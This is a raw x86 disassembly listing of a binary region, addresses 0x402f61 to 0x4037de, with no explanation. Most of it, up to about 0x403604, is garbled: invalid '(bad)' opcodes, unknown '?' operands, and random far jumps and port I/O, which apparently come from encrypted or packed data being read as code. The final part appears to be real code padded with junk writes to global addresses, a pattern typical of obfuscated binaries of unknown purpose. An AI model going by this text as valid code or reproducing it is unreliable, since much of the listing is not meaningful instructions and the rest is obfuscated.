  402f61:	push   0xffffffee
  402f63:	mov    esi,0x587de349
  402f68:	outs   dx,DWORD PTR ds:[esi]
  402f69:	into   
  402f6a:	retf   
  402f6b:	retf   0xde08
  402f6e:	adc    cl,BYTE PTR [edi]
  402f70:	xchg   esi,eax
  402f71:	lea    edx,[edi+edi*1+0x5430054c]
  402f78:	pop    eax
  402f79:	gs xchg sp,ax
  402f7c:	jnp    0x402fbb
  402f7e:	(bad)  
  402f7f:	xchg   edx,eax
  402f80:	adc    al,0x9c
  402f82:	std    
  402f83:	adc    eax,0xd9c5cfef
  402f88:	in     al,0x14
  402f8a:	xchg   ebp,eax
  402f8b:	(bad)  
  402f8c:	push   ebp
  402f8d:	fbld   TBYTE PTR [edx+0x63b1d14b]
  402f93:	push   ebp
  402f94:	xchg   ebx,eax
  402f95:	in     eax,0x47
  402f97:	pop    ebp
  402f98:	jne    0x402f9c
  402f9a:	push   esi
  402f9b:	push   edx
  402f9c:	and    BYTE PTR [esi],ah
  402f9e:	jbe    0x402fb0
  402fa0:	mov    WORD PTR [edi],?
  402fa2:	ins    BYTE PTR es:[edi],dx
  402fa3:	out    0xe3,eax
  402fa5:	push   0xffffff90
  402fa7:	adc    DWORD PTR [edx+0x29bcaa1d],0x1d
  402fae:	sub    DWORD PTR [ebx+0x5],ecx
  402fb1:	retf   0x4695
  402fb4:	xchg   esi,eax
  402fb5:	loope  0x402f3f
  402fb7:	jl     0x402f50
  402fb9:	pop    ss
  402fba:	sub    DWORD PTR [eax-0x3ad60cb1],ebp
  402fc0:	pop    es
  402fc1:	push   eax
  402fc2:	and    ecx,DWORD PTR [esi-0x7c7440e1]
  402fc8:	mov    bh,0x6d
  402fca:	sahf   
  402fcb:	add    dl,BYTE PTR [edx]
  402fcd:	fcom   DWORD PTR [ebx]
  402fcf:	jnp    0x402fae
  402fd1:	cmp    DWORD PTR [ebp+0x35dbab93],ebx
  402fd7:	cmp    eax,0x3045285c
  402fdc:	add    DWORD PTR [edi],ebx
  402fde:	adc    DWORD PTR ds:0x9a5155b7,ebp
  402fe4:	mov    cl,0xe7
  402fe6:	out    dx,al
  402fe7:	pushf  
  402fe8:	xlat   BYTE PTR ds:[ebx]
  402fe9:	jl     0x402fd5
  402feb:	ds rol dh,1
  402fee:	xchg   ecx,eax
  402fef:	mov    esp,0x6ac7fc76
  402ff4:	loopne 0x402fe8
  402ff6:	cmp    dl,BYTE PTR [ebp-0x322b4d22]
  402ffc:	fdivrp st(3),st
  402ffe:	mov    eax,0x1fadace2
  403003:	mov    eax,ecx
  403005:	mov    dh,0x5
  403007:	inc    eax
  403008:	pop    ebx
  403009:	jmp    FWORD PTR [ebx-0x34]
  40300c:	push   cs
  40300d:	sbb    al,0xd9
  40300f:	pop    eax
  403010:	jno    0x40307c
  403012:	es dec eax
  403014:	test   BYTE PTR [edi],dl
  403016:	fs jne 0x40300d
  403019:	or     eax,DWORD PTR [ecx]
  40301b:	in     al,0x26
  40301d:	and    BYTE PTR [ecx+0x3a],0x57
  403021:	mov    ebp,0x27f1c01e
  403026:	das    
  403027:	xor    edx,esp
  403029:	jnp    0x402fe0
  40302b:	pop    edi
  40302c:	loop   0x403016
  40302e:	jb     0x402ff0
  403030:	ret    0x4534
  403033:	jle    0x402fde
  403035:	mov    cl,ch
  403037:	fidiv  WORD PTR [ebx+edi*2-0x49]
  40303b:	inc    ecx
  40303c:	inc    ebp
  40303d:	imul   ebp,edx,0x93a93bb0
  403043:	push   ds
  403044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403045:	mov    bh,BYTE PTR [eax+0x76]
  403048:	(bad)  
  403049:	cmp    al,0x5
  40304b:	add    eax,0xd72b5caf
  403050:	cs pushf 
  403052:	fimul  DWORD PTR [ecx-0x26]
  403055:	sub    al,0x82
  403057:	xchg   esi,eax
  403058:	jmp    0x68da:0x60c03f2b
  40305f:	(bad)  
  403060:	in     al,0x8a
  403062:	std    
  403063:	ins    BYTE PTR es:[edi],dx
  403064:	and    al,0xa8
  403066:	icebp  
  403067:	mov    ecx,0x91b83156
  40306c:	out    0x90,eax
  40306e:	call   0xa67b:0x5d4a8de8
  403075:	adc    al,BYTE PTR [ebx-0x888a279]
  40307b:	or     esp,DWORD PTR [ebp-0x1e]
  40307e:	pop    esp
  40307f:	enter  0x1919,0x6b
  403083:	aaa    
  403084:	inc    esi
  403085:	dec    ecx
  403086:	ins    DWORD PTR es:[edi],dx
  403087:	jmp    0xe86202bb
  40308c:	jo     0x403080
  40308e:	add    dh,0x44
  403091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403092:	retf   0xef7b
  403095:	mov    ecx,0x5d87a94e
  40309a:	popa   
  40309b:	in     eax,0x85
  40309d:	repz dec eax
  40309f:	push   ecx
  4030a0:	xchg   ecx,eax
  4030a1:	xchg   DWORD PTR [edi],edi
  4030a3:	cmp    al,0x32
  4030a5:	fiadd  WORD PTR [edx+ebx*2-0x6d]
  4030a9:	int3   
  4030aa:	xor    bh,bl
  4030ac:	scas   eax,DWORD PTR es:[edi]
  4030ad:	dec    ebp
  4030ae:	leave  
  4030af:	mov    ecx,0xaa93bf02
  4030b4:	jmp    0x3ffd:0xa85a2df1
  4030bb:	or     al,0xea
  4030bd:	aad    0x37
  4030bf:	add    ebx,0xf3659d79
  4030c5:	shl    DWORD PTR [eax-0x49],cl
  4030c8:	mov    esp,DWORD PTR [esi]
  4030ca:	push   edx
  4030cb:	ror    BYTE PTR [ebx+esi*2+0x24c197c9],cl
  4030d2:	loope  0x4030ce
  4030d4:	mov    ch,0x61
  4030d6:	ds cs push ebx
  4030d9:	dec    ebx
  4030da:	jecxz  0x4030fd
  4030dc:	aad    0x14
  4030de:	sub    al,0x5b
  4030e1:	bound  ebp,QWORD PTR [ecx+0x1d47cb6f]
  4030e7:	call   0xce9aceb0
  4030ec:	add    edi,ebx
  4030ee:	mov    ?,WORD PTR [ebp+0x29]
  4030f1:	aad    0x87
  4030f3:	retf   
  4030f4:	imul   ebx,edx,0x27
  4030f7:	leave  
  4030f8:	retf   0xaed0
  4030fb:	jp     0x4030a2
  4030fd:	sbb    al,0x2f
  4030ff:	int    0x3b
  403101:	es jle 0x40311e
  403104:	scas   al,BYTE PTR es:[edi]
  403105:	mov    bl,0x8d
  403107:	je     0x403186
  403109:	sub    DWORD PTR [ebx-0x3b],edx
  40310c:	sub    ebp,edi
  40310e:	add    dl,bl
  403110:	pop    esi
  403111:	jecxz  0x4030b1
  403113:	add    ecx,DWORD PTR [esi+0x72]
  403116:	sub    BYTE PTR [ecx],dl
  403118:	jnp    0x403198
  40311a:	jne    0x4030ea
  40311c:	push   eax
  40311d:	icebp  
  40311e:	pusha  
  40311f:	fstp   DWORD PTR [edi+0x317059da]
  403125:	stos   BYTE PTR es:[edi],al
  403126:	and    dl,bl
  403128:	outs   dx,BYTE PTR ds:[esi]
  403129:	sbb    edx,DWORD PTR [ebx]
  40312b:	xchg   ecx,eax
  40312c:	push   es
  40312d:	push   esi
  40312e:	lahf   
  40312f:	das    
  403130:	into   
  403131:	push   eax
  403132:	sbb    edi,edi
  403134:	ins    DWORD PTR es:[edi],dx
  403135:	fisttp WORD PTR [edi+0x7ffe661f]
  40313b:	cwde   
  40313c:	ret    0xada3
  40313f:	addr16 test al,0x6d
  403142:	xor    eax,0x59430b10
  403147:	ins    BYTE PTR es:[edi],dx
  403148:	scas   al,BYTE PTR es:[edi]
  403149:	iret   
  40314a:	push   ecx
  40314b:	mov    al,ds:0x7ac98406
  403150:	sbb    cl,BYTE PTR [esi-0x35166ca2]
  403156:	sub    DWORD PTR [ebp-0x59],0xffffffd5
  40315a:	jb     0x40310a
  40315c:	mov    eax,ds:0x65c03727
  403161:	(bad)  
  403162:	aad    0x51
  403164:	cmc    
  403165:	fadd   DWORD PTR [eax+ecx*8]
  403168:	mov    dl,0xd1
  40316a:	test   BYTE PTR [eax+ebp*8],ah
  40316d:	test   DWORD PTR [ebx-0xa],ebp
  403170:	lods   eax,DWORD PTR ds:[esi]
  403171:	sbb    dh,BYTE PTR [edi+0x28]
  403174:	ret    0xd545
  403177:	sub    DWORD PTR [ecx+edi*2],0xffffffc8
  40317b:	cmp    BYTE PTR [edx+0x4815d420],bl
  403181:	push   edi
  403182:	xchg   esi,eax
  403183:	out    dx,eax
  403184:	adc    DWORD PTR es:[edx],ebp
  403187:	call   0xcc12:0xebf24ca
  40318e:	imul   esi,DWORD PTR [edx-0x56],0x49
  403192:	xor    ebp,edi
  403194:	int3   
  403195:	xor    edx,DWORD PTR [edi-0x16]
  403198:	(bad)  
  403199:	in     eax,0x96
  40319b:	jbe    0x403209
  40319d:	cmp    DWORD PTR [ecx-0x6b750718],0x61
  4031a4:	imul   eax,DWORD PTR [esi+ebp*8-0x34a291cf],0x75
  4031ac:	iret   
  4031ad:	pushf  
  4031ae:	cmp    BYTE PTR [edx+0x59bf7680],dh
  4031b4:	inc    ecx
  4031b5:	xchg   ebx,eax
  4031b6:	sub    al,0xec
  4031b8:	add    BYTE PTR [ebx-0x25],bh
  4031bb:	dec    esi
  4031bc:	fiadd  DWORD PTR [edx-0x50d7fa8a]
  4031c2:	jno    0x403213
  4031c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031c5:	xor    ecx,DWORD PTR ds:0x5a6cdeaf
  4031cb:	outs   dx,BYTE PTR ds:[esi]
  4031cc:	cdq    
  4031cd:	shl    DWORD PTR [edi+eax*2+0x7ec43ef9],0x57
  4031d5:	xor    DWORD PTR cs:[ebx+edx*8+0x51],esi
  4031da:	mov    ds:0x6509af1e,eax
  4031df:	fdiv   st,st(7)
  4031e1:	jecxz  0x40317f
  4031e3:	loop   0x4031c3
  4031e5:	(bad)  
  4031e6:	scas   al,BYTE PTR es:[edi]
  4031e7:	loopne 0x403222
  4031e9:	add    BYTE PTR [edx-0x55],bh
  4031ec:	cmp    DWORD PTR [ebx*1-0x22eb578],esp
  4031f3:	cli    
  4031f4:	adc    dh,BYTE PTR [ebx]
  4031f6:	mov    al,ds:0x4885c7ae
  4031fb:	aas    
  4031fc:	stc    
  4031fd:	lds    edi,FWORD PTR ds:0x35de09ba
  403203:	mov    esi,0xd18377cd
  403208:	repz jg 0x403199
  40320b:	jl     0x403283
  40320d:	jge    0x403210
  40320f:	dec    ecx
  403210:	cmp    BYTE PTR [edx],dh
  403212:	dec    DWORD PTR [esi]
  403214:	xchg   ecx,eax
  403215:	rcr    BYTE PTR [edx-0x7d44219a],cl
  40321b:	xor    BYTE PTR [eax-0x1b],ah
  40321e:	loopne 0x403273
  403220:	pop    eax
  403221:	cdq    
  403222:	jg     0x403203
  403224:	mov    esp,0x7bf4b090
  403229:	xchg   ah,bh
  40322b:	jns    0x4031c8
  40322d:	or     DWORD PTR [edx],ebp
  40322f:	and    edx,DWORD PTR [esi]
  403231:	mov    ebp,fs
  403233:	cli    
  403234:	adc    ebp,eax
  403236:	jg     0x4031ca
  403238:	dec    ebx
  403239:	pusha  
  40323a:	sbb    al,0x39
  40323c:	inc    edi
  40323d:	or     al,0x1b
  40323f:	out    dx,eax
  403240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403241:	mov    edx,gs
  403243:	cli    
  403244:	pop    es
  403245:	dec    esi
  403246:	inc    edi
  403247:	fstp   QWORD PTR [esi]
  403249:	hlt    
  40324a:	jp     0x4032b6
  40324c:	or     eax,0x2139e3ad
  403251:	xor    DWORD PTR [edi+0x2ecb3e20],ebp
  403257:	push   edi
  403258:	mov    edi,0xde959dc3
  40325d:	xor    al,0x17
  40325f:	jns    0x40324d
  403261:	mov    esi,0xa4192fa5
  403266:	fldenv [edx-0x63]
  403269:	dec    ecx
  40326a:	push   0x4256aeb2
  40326f:	test   BYTE PTR [ecx+0x12811068],ch
  403275:	gs imul ebp,ebp,0xffffffcc
  403279:	test   BYTE PTR [edi-0x42],0xee
  40327d:	sub    ebx,DWORD PTR gs:[eax-0x7b]
  403281:	cmp    eax,0xebdd4304
  403286:	xchg   ecx,eax
  403287:	out    0x14,eax
  403289:	ror    edx,0xd8
  40328c:	cmp    al,0xf2
  40328e:	std    
  40328f:	(bad)  
  403290:	pop    esp
  403291:	and    al,0x3a
  403293:	and    dh,BYTE PTR [edx]
  403295:	jg     0x40326c
  403297:	aam    0x60
  403299:	push   0xffffffb5
  40329b:	jae    0x4032f8
  40329d:	int    0xee
  40329f:	push   ds
  4032a0:	ror    BYTE PTR [edx+0x39],1
  4032a3:	mov    esp,DWORD PTR [esi]
  4032a5:	ret    0x6dda
  4032a8:	and    BYTE PTR [edx-0x41343104],dh
  4032ae:	push   ebx
  4032af:	lods   al,BYTE PTR ds:[esi]
  4032b0:	pop    ss
  4032b1:	or     al,0x59
  4032b3:	dec    eax
  4032b4:	sub    al,0xe1
  4032b6:	rcl    bh,0x66
  4032b9:	mov    dl,0x1f
  4032bb:	inc    edx
  4032bc:	lahf   
  4032bd:	push   edx
  4032be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032bf:	or     BYTE PTR [esi],bh
  4032c1:	and    ch,BYTE PTR [ecx+ecx*4-0x5d]
  4032c5:	out    0x80,al
  4032c7:	shld   edi,ecx,cl
  4032ca:	inc    esi
  4032cb:	dec    dl
  4032cd:	jo     0x403335
  4032cf:	jle    0x4032a6
  4032d1:	rcl    DWORD PTR [ecx-0x5a],cl
  4032d4:	outs   dx,DWORD PTR ds:[esi]
  4032d5:	scas   eax,DWORD PTR es:[edi]
  4032d6:	mov    DWORD PTR [esi-0x3d],eax
  4032d9:	pop    ss
  4032da:	fld    TBYTE PTR [ebx+edi*8-0x10494961]
  4032e1:	hlt    
  4032e2:	fidivr WORD PTR [eax]
  4032e4:	mov    ah,0xf2
  4032e6:	shl    DWORD PTR [ebp-0x53ccaa14],cl
  4032ec:	ins    BYTE PTR es:[edi],dx
  4032ed:	xor    DWORD PTR [ebp+esi*1-0x5a],0x4a
  4032f2:	addr16 pop esi
  4032f4:	or     DWORD PTR [ecx-0x5108590a],0x10
  4032fb:	in     eax,dx
  4032fc:	pop    eax
  4032fd:	aas    
  4032fe:	pop    ss
  4032ff:	jo     0x403294
  403301:	mov    ds:0x16d2bfc1,eax
  403307:	jns    0x40329b
  403309:	(bad)  
  40330a:	jmp    0x403364
  40330c:	(bad)  
  40330d:	ret    
  40330e:	push   ebp
  40330f:	sub    BYTE PTR [ebp-0x5ca22e2],bh
  403315:	jmp    0xa944f59e
  40331a:	iret   
  40331b:	(bad)
  40331e:	out    dx,al
  40331f:	pop    es
  403320:	jmp    0xcd4a47b5
  403325:	es mov ebp,0xdf986869
  40332b:	adc    eax,DWORD PTR [ecx]
  40332d:	fdiv   QWORD PTR [ebp-0x61306468]
  403333:	xchg   DWORD PTR [edi],ebx
  403335:	out    dx,eax
  403336:	dec    edi
  403337:	jge    0x4032e9
  403339:	psraw  mm5,QWORD PTR [edx-0x189b3dbb]
  403340:	jge    0x4033c1
  403342:	enter  0x68ee,0x89
  403346:	sub    bl,BYTE PTR [ecx]
  403348:	sub    BYTE PTR [ebx+0x686a04f3],al
  40334e:	int3   
  40334f:	ret    
  403350:	das    
  403351:	or     esp,DWORD PTR [edi+0x48]
  403354:	(bad)  
  403356:	and    cl,BYTE PTR ds:0xa298489
  40335c:	cs xor ecx,ebp
  40335f:	(bad)  
  403360:	out    dx,al
  403361:	sbb    edx,ebp
  403363:	mov    edx,0x5822a4cd
  403368:	mov    bh,0x2
  40336a:	cwde   
  40336b:	ss ins DWORD PTR es:[edi],dx
  40336d:	iret   
  40336e:	mov    ds:0xb80ecfef,eax
  403373:	cli    
  403374:	call   0xa8fc:0xe7eab98
  40337b:	jl     0x40338a
  40337d:	push   es
  40337e:	inc    edi
  40337f:	out    0xd2,eax
  403381:	nop
  403382:	ss cmp al,0x93
  403385:	in     eax,0x81
  403387:	xchg   ebx,eax
  403388:	rol    bl,0x44
  40338b:	pop    esp
  40338c:	push   0x7245a0ad
  403391:	pop    ds
  403392:	cmp    eax,0xdfa8fe36
  403397:	or     al,0xe7
  403399:	rcl    DWORD PTR [eax],0x61
  40339c:	aas    
  40339d:	adc    eax,0x6c1ce11
  4033a2:	mov    al,ds:0x378a37c0
  4033a7:	std    
  4033a8:	out    0xf0,eax
  4033aa:	into   
  4033ab:	xchg   esp,eax
  4033ac:	mov    esi,?
  4033ae:	pop    edx
  4033af:	mov    eax,0xffe16397
  4033b4:	cwde   
  4033b5:	mov    cl,0xfc
  4033b7:	pop    edi
  4033b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033b9:	xchg   esi,eax
  4033ba:	daa    
  4033bb:	bound  ebx,QWORD PTR [ecx+0x3abdcc61]
  4033c1:	pop    edx
  4033c2:	mov    bh,0xc1
  4033c4:	neg    ebp
  4033c6:	mov    ebx,0xf13d1aa6
  4033cb:	fnstcw WORD PTR [ebx+0x47c2d484]
  4033d1:	and    ecx,DWORD PTR [edx]
  4033d3:	call   0xb18:0xd47f3311
  4033da:	cmc    
  4033db:	sub    al,0x16
  4033dd:	aam    0x11
  4033df:	cmp    DWORD PTR [esi-0x205578a0],ebp
  4033e5:	rol    DWORD PTR [ecx+0x33fbadf3],1
  4033eb:	iret   
  4033ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033ed:	ins    BYTE PTR es:[edi],dx
  4033ee:	mov    ebp,0xb3c089c6
  4033f3:	mov    edx,esi
  4033f5:	mov    dl,0xd8
  4033f7:	int    0xaa
  4033f9:	and    ah,dl
  4033fb:	inc    esi
  4033fc:	daa    
  4033fd:	jae    0x403383
  4033ff:	and    DWORD PTR [edi+0x4a6878c9],ebx
  403405:	call   0x7a39:0xde521c59
  40340c:	je     0x4033f6
  40340e:	fs push cs
  403410:	cld    
  403411:	(bad)  
  403413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403414:	sbb    ebx,DWORD PTR [edi+esi*1+0x27]
  403418:	lock fst DWORD PTR [esi]
  40341b:	xchg   BYTE PTR [edi+0x3178e0e0],ah
  403421:	inc    ebx
  403422:	div    dl
  403424:	dec    esp
  403425:	gs call 0xe1b0:0xba9dc80a
  40342d:	mov    esi,ebx
  40342f:	pop    ebx
  403430:	sti    
  403431:	jge    0x403499
  403433:	push   0xefefa779
  403438:	xor    ebx,ebp
  40343a:	outs   dx,DWORD PTR ds:[esi]
  40343b:	push   0x82293e5b
  403440:	dec    ebx
  403441:	fcmovnu st,st(7)
  403443:	and    edx,eax
  403445:	adc    eax,0xaf9b51df
  40344a:	loop   0x40348e
  40344c:	mov    ch,0xb6
  40344e:	push   edx
  40344f:	(bad)
  403452:	test   edx,esi
  403454:	adc    BYTE PTR [edi+0x18],ah
  403457:	or     ebp,DWORD PTR ds:0x65c38d73
  40345d:	inc    edx
  40345e:	std    
  40345f:	sbb    esp,ebx
  403461:	mov    ebx,DWORD PTR [edx]
  403463:	inc    esp
  403464:	not    dh
  403466:	mov    esp,0xf94775cb
  40346b:	loope  0x403491
  40346d:	std    
  40346e:	pop    es
  40346f:	xlat   BYTE PTR ds:[ebx]
  403470:	sub    ecx,DWORD PTR [ecx]
  403472:	adc    esp,DWORD PTR [ecx]
  403474:	sbb    ebx,DWORD PTR [eax-0x445771ba]
  40347a:	lods   al,BYTE PTR ds:[esi]
  40347b:	and    dl,bh
  40347d:	data16 xor ah,BYTE PTR [esi]
  403480:	(bad)  
  403481:	imul   ebx,DWORD PTR [ebp+edx*1-0x5],0x3c
  403486:	mov    ch,BYTE PTR [esi+0x43]
  403489:	and    bh,al
  40348b:	cmp    eax,0x7289ab65
  403490:	pop    edi
  403491:	stos   BYTE PTR es:[edi],al
  403492:	cmp    eax,0x95031791
  403497:	xchg   ebp,eax
  403498:	sub    eax,DWORD PTR [ebp-0x3a]
  40349b:	add    al,0xbd
  40349d:	xchg   bh,ch
  40349f:	dec    ecx
  4034a0:	dec    ebp
  4034a1:	dec    ebp
  4034a2:	mov    edx,0x63e986bf
  4034a7:	jbe    0x40345f
  4034a9:	jp     0x40347d
  4034ab:	les    ebp,FWORD PTR [edi+0x4b5f9fc]
  4034b1:	sub    al,0xab
  4034b3:	adc    ebx,0xe172575a
  4034b9:	aaa    
  4034ba:	es movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4034bd:	std    
  4034be:	dec    ebx
  4034bf:	fld    QWORD PTR [edx+0x609d6501]
  4034c5:	cwde   
  4034c6:	push   esp
  4034c7:	lods   eax,DWORD PTR ds:[esi]
  4034c8:	or     eax,0x40c61c2e
  4034cd:	push   ebp
  4034ce:	push   cs
  4034cf:	jne    0x403467
  4034d1:	push   0xffffffbe
  4034d3:	mov    ds:0x6e5f288,al
  4034d8:	jno    0x40348c
  4034da:	cmc    
  4034db:	cmp    DWORD PTR [edi],ebp
  4034dd:	fist   DWORD PTR [ecx-0xd]
  4034e0:	mov    ch,0xe0
  4034e2:	dec    eax
  4034e3:	cmp    ebx,ebx
  4034e5:	test   BYTE PTR [ebp-0x7919cdb6],ah
  4034eb:	rol    DWORD PTR [edi+0x73a602b9],1
  4034f1:	out    0x63,eax
  4034f3:	in     al,dx
  4034f4:	loopne 0x40347e
  4034f6:	fstp   QWORD PTR [esp+ebp*8+0x4f499f5e]
  4034fd:	loopne 0x40355a
  4034ff:	jne    0x403530
  403501:	dec    esi
  403502:	mov    ah,0x21
  403504:	jg     0x403582
  403506:	fwait
  403507:	clc    
  403508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403509:	scas   eax,DWORD PTR es:[edi]
  40350a:	mov    es,WORD PTR [ecx]
  40350c:	repnz xchg esp,eax
  40350e:	jle    0x403566
  403510:	adc    BYTE PTR [eax-0x29],dl
  403513:	call   0x868a:0x9238998f
  40351a:	retf   0xa8e4
  40351d:	fcomp  DWORD PTR ds:0xfbb760ec
  403523:	mov    DWORD PTR [edx-0x2d],ebx
  403526:	(bad)  
  403527:	cmc    
  403528:	lea    ecx,ds:0xfa52e2a9
  40352e:	push   ss
  40352f:	jmp    0x6900ef8b
  403534:	jle    0x40353b
  403536:	retf   
  403537:	in     al,dx
  403538:	scas   al,BYTE PTR es:[edi]
  403539:	out    dx,al
  40353a:	sub    bl,BYTE PTR [edi+0x4]
  40353d:	inc    BYTE PTR [edx+0x196b62e7]
  403543:	cs xor ebx,eax
  403546:	mov    ch,0xc8
  403548:	je     0x403599
  40354a:	jge    0x403519
  40354c:	mov    bh,0x1a
  40354e:	in     eax,dx
  40354f:	pop    edi
  403550:	adc    ebp,ecx
  403552:	jmp    0x7ed102dc
  403557:	pushf  
  403558:	jle    0x403582
  40355a:	xor    DWORD PTR [esi],edx
  40355c:	ja     0x403573
  40355e:	adc    eax,0xfecf268f
  403563:	xchg   edx,eax
  403564:	add    eax,0x9195dabb
  403569:	mov    ecx,DWORD PTR [ebx]
  40356b:	cmp    edi,DWORD PTR [ecx+edi*8-0x5a]
  40356f:	pop    eax
  403570:	cmp    bl,BYTE PTR [edi-0x74b56ce2]
  403576:	pop    edx
  403577:	in     eax,0xc4
  403579:	out    0xb6,al
  40357b:	jno    0x40358a
  40357d:	clc    
  40357e:	cmp    edx,DWORD PTR [edx-0x24d14543]
  403584:	imul   ebp,DWORD PTR [edi-0x6bed7519],0x86d7e444
  40358e:	sahf   
  40358f:	sbb    edx,DWORD PTR [eax-0x21]
  403592:	les    esi,FWORD PTR [ebx]
  403594:	sbb    cl,dl
  403596:	sub    BYTE PTR ds:0x553b3856,bh
  40359c:	adc    ah,BYTE PTR gs:[eax+0x64a5e816]
  4035a3:	and    al,0x0
  4035a5:	clc    
  4035a6:	pop    eax
  4035a7:	and    al,0xb2
  4035a9:	fsubr  QWORD PTR [ebp+0x3c0559d]
  4035af:	mov    esp,ebx
  4035b1:	mov    edx,0x63e6bc13
  4035b6:	mov    dl,BYTE PTR [ebx+0x46719f2d]
  4035bc:	icebp  
  4035bd:	mov    eax,0x66d31e71
  4035c2:	push   ebp
  4035c3:	rol    BYTE PTR [eax],cl
  4035c5:	fimul  WORD PTR [edi+edx*2-0x6c423551]
  4035cc:	loopne 0x403644
  4035ce:	ret    0x6c57
  4035d1:	loop   0x403568
  4035d3:	stos   DWORD PTR es:[edi],eax
  4035d4:	jns    0x4035cc
  4035d6:	je     0x4035a1
  4035d8:	test   eax,0xebc78e24
  4035dd:	jge    0x403598
  4035df:	out    0x73,eax
  4035e1:	in     eax,dx
  4035e2:	stos   BYTE PTR es:[edi],al
  4035e3:	add    BYTE PTR [eax],dh
  4035e5:	(bad)  
  4035e6:	hlt    
  4035e7:	dec    edi
  4035e8:	mov    ah,0x54
  4035ea:	push   0xe
  4035ec:	xor    ebp,DWORD PTR [edx]
  4035ee:	and    eax,0xa3beddda
  4035f3:	pop    edx
  4035f4:	int3   
  4035f5:	ffree  st(7)
  4035f7:	test   DWORD PTR [eax-0x1],esp
  4035fa:	(bad)  
  4035fb:	(bad)  
  4035fc:	mov    ecx,0xa1f89c85
  403601:	jle    0x4035a5
  403603:	inc    edx
  403604:	add    BYTE PTR [ecx],cl
  403606:	add    eax,0x42a27a
  40360b:	mov    eax,DWORD PTR [ebp-0x14]
  40360e:	mov    DWORD PTR [ebp-0x9c],eax
  403614:	adc    DWORD PTR ds:0x42a29a,ecx
  40361a:	mov    eax,DWORD PTR [ebp-0x18]
  40361d:	mov    DWORD PTR [ebp-0x98],eax
  403623:	sbb    DWORD PTR ds:0x42a28a,0x5122
  40362d:	mov    eax,DWORD PTR [ebp-0x2c]
  403630:	xor    eax,esi
  403632:	add    eax,edi
  403634:	or     DWORD PTR ds:0x42a27a,0x42a2ea
  40363e:	mov    DWORD PTR [ebp-0x94],eax
  403644:	lea    eax,[ebp-0x48]
  403647:	mov    DWORD PTR [ebp-0x90],eax
  40364d:	mov    eax,DWORD PTR [ebp-0xa0]
  403653:	xor    eax,esi
  403655:	sbb    DWORD PTR ds:0x42a2f2,0x42a2da
  40365f:	add    eax,edi
  403661:	or     DWORD PTR ds:0x42a2ee,0x42a256
  40366b:	mov    DWORD PTR [ebp-0xa0],eax
  403671:	sub    DWORD PTR ds:0x42a272,0x1d49
  40367b:	lea    eax,[ebp-0xa0]
  403681:	push   eax
  403682:	neg    eax
  403684:	mov    eax,DWORD PTR [ebp+0xc]
  403687:	sub    DWORD PTR ds:0x42a2aa,0x2c11
  403691:	xor    eax,esi
  403693:	add    eax,edi
  403695:	push   eax
  403696:	mov    eax,ds:0x42943e
  40369b:	push   0x429394
  4036a0:	mov    DWORD PTR ds:0x42a286,0x524d
  4036aa:	push   DWORD PTR [eax]
  4036ac:	call   0x4084f6
  4036b1:	xor    edx,edx
  4036b3:	add    edx,DWORD PTR ds:0x42a29e
  4036b9:	and    DWORD PTR ds:0x42a28e,edx
  4036bf:	mov    ebx,DWORD PTR [ebp-0x14]
  4036c2:	mov    eax,DWORD PTR [ebp-0x18]
  4036c5:	mov    DWORD PTR [ebp-0x58],eax
  4036c8:	mov    eax,ds:0x42a306
  4036cd:	mov    edx,DWORD PTR ds:0x42a34e
  4036d3:	sub    edx,eax
  4036d5:	sub    eax,DWORD PTR [eax+edx*1]
  4036d8:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  4036df:	mov    eax,0xf89c85bb
  4036e4:	mov    DWORD PTR [ebp-0x1c],eax
  4036e7:	xor    DWORD PTR ds:0x42a286,0x37ec
  4036f1:	lea    ecx,[eax-0x16]
  4036f4:	and    DWORD PTR ds:0x42a2e2,0x0
  4036fe:	jmp    0x403710
  403703:	mov    edx,DWORD PTR ds:0x42a2e2
  403709:	inc    edx
  40370a:	mov    DWORD PTR ds:0x42a2e2,edx
  403710:	cmp    DWORD PTR ds:0x42a2e2,0x18
  403717:	jae    0x40376b
  40371d:	cmp    DWORD PTR ds:0x42a2e2,0x4
  403724:	jl     0x40376b
  40372a:	jmp    0x40374c
  40372f:	push   DWORD PTR [ebp-0x20]
  403732:	push   DWORD PTR [ebp-0x18]
  403735:	push   DWORD PTR [ebp-0x20]
  403738:	push   DWORD PTR [ebp-0x18]
  40373b:	push   DWORD PTR [ebp-0x14]
  40373e:	push   DWORD PTR [ebp-0x20]
  403741:	push   0x429247
  403746:	call   DWORD PTR ds:0x42a3d6
  40374c:	cmp    DWORD PTR ds:0x42a2e2,0x3
  403753:	jne    0x403766
  403759:	mov    edx,DWORD PTR ds:0x42a2e2
  40375f:	inc    edx
  403760:	mov    DWORD PTR ds:0x42a2e2,edx
  403766:	jmp    0x403703
  40376b:	mov    DWORD PTR [ebp-0x28],ecx
  40376e:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  403775:	neg    DWORD PTR ds:0x42a25e
  40377b:	mov    DWORD PTR [ebp-0x8],eax
  40377e:	xor    edx,edx
  403780:	or     edx,DWORD PTR ds:0x42a2da
  403786:	xor    DWORD PTR ds:0x42a29a,edx
  40378c:	mov    eax,DWORD PTR [ebp-0x10]
  40378f:	neg    edx
  403791:	xor    eax,esi
  403793:	mov    edx,0xffcd8d8f
  403798:	sub    edx,eax
  40379a:	mov    eax,ds:0x42a2fe
  40379f:	mov    DWORD PTR [ebp-0xc],edx
  4037a2:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  4037a9:	mov    eax,DWORD PTR [ebp-0x8]
  4037ac:	mov    DWORD PTR ds:0x42a2ce,0x6d9f
  4037b6:	mov    DWORD PTR [ebp-0x3c],ebx
  4037b9:	mov    DWORD PTR ds:0x42a286,0xb52
  4037c3:	cmp    eax,ecx
  4037c5:	mov    DWORD PTR ds:0x42a2d2,0x1900
  4037cf:	je     0x408220
  4037d5:	xor    DWORD PTR ds:0x42a2b6,edx
  4037db:	mov    eax,DWORD PTR [ebp-0x10]
  4037de:	jmp    0x405b37
